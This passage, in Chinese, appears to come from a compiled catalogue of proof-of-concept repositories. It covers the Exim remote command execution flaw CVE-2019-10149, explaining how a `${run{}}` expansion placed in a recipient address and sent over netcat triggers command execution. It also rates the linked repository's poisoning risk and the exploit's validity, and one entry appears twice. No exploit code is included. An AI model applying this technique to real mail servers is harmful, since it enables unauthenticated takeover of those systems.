3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---



---

## POC #17

**来源**: [CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md](../2019/CVE-2019-10149-uyerr_PoC_CVE-2019-10149--rce.md)

## CVE-2019-10149 - Exim Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意命令。

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行着受影响版本的Exim，并且可以通过网络访问到Exim服务端口（通常是25端口）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞位于`deliver_message()`函数中，由于对收件人地址的验证不当导致。攻击者可以通过发送特制的电子邮件，利用`${run{}}` 扩展功能执行任意命令。 

**漏洞利用方式：**

1.  攻击者向易受攻击的Exim服务器发送包含恶意收件人地址的邮件。恶意地址包含一个`${run{}}`块，其中包含要执行的命令。
2.  当Exim处理邮件时，它会尝试解析收件人地址，从而触发`${run{}}` 扩展。
3.  `${run{}}` 扩展执行指定的命令，从而允许攻击者在服务器上执行任意代码。

**POC 代码分析：**

提供的`exploit.sh`脚本通过`netcat`工具建立TCP连接，模拟SMTP协议交互，向目标Exim服务器发送精心构造的邮件。 其中，收件人地址的用户名部分包含`${run{}}`扩展，该扩展会被Exim执行，从而在服务器上执行任意shell命令。

**投毒风险评估：**

该仓库中的代码主要包含漏洞说明文件和一个漏洞利用脚本。漏洞利用脚本本身的功能是利用已知的Exim漏洞执行命令，没有发现额外的恶意或隐藏行为。因此，该仓库的投毒风险较低。虽然使用了`${run{}}`执行命令，但是这个是POC本身需要利用的特性，不能算作投毒。

**有效性：**

根据漏洞库信息、搜索结果，漏洞是真实存在的，并且存在可用的POC。该POC代码基于Qualys发布的POC，在目标环境满足漏洞利用条件的情况下，可以有效触发远程命令执行。

**项目地址:** [uyerr/PoC_CVE-2019-10149--rce](https://github.com/uyerr/PoC_CVE-2019-10149--rce)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

